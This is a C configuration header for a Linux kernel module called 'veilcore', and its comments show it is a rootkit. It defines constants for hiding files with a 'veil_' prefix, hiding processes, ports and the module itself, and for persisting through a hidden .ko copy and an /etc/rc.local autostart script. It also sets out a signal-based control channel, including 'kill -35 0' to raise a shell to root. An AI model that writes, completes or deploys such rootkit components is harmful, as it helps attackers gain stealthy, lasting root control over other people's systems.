/* SPDX-License-Identifier: GPL-2.0 */
/*
 * config.h - tunable constants for the veilcore module.
 */
#ifndef VEILCORE_CONFIG_H
#define VEILCORE_CONFIG_H

/* Name visible in lsmod; also filtered from /sys/module enumeration when
 * the module is hidden. */
#define MODULE_DISPLAY_NAME    "veilcore"

/* Filenames starting with this prefix never show up in getdents. */
#define MAGIC_PREFIX           "veil_"

/* task->flags bit marking a hidden process. */
#define PF_INVISIBLE           0x10000000

/* Persistence: the running .ko image is cached at load and written back to
 * this path on reboot/unload, plus an autostart script wired into rc.local. */
#define DEFAULT_KO_PATH        "/var/.veilcore.ko"
#define PERSISTENCE_SCRIPT     "/etc/veilcore_load.sh"
#define RC_LOCAL_PATH          "/etc/rc.local"

/* Control plane rides the kill(2) syscall with private signal numbers. */
#define SIG_PROC_TOGGLE        34    /* kill -34 <pid>  toggle process visibility */
#define SIG_ROOT_ELEVATE       35    /* kill -35 0      elevate current shell to root */
#define SIG_MOD_VISIBILITY     36    /* kill -36 0      toggle module visibility in lsmod */
#define SIG_PORT_TOGGLE        37    /* kill -37 <port> toggle port hiding (port in pid arg) */

#define MAX_HIDDEN_PORTS       16

#endif /* VEILCORE_CONFIG_H */
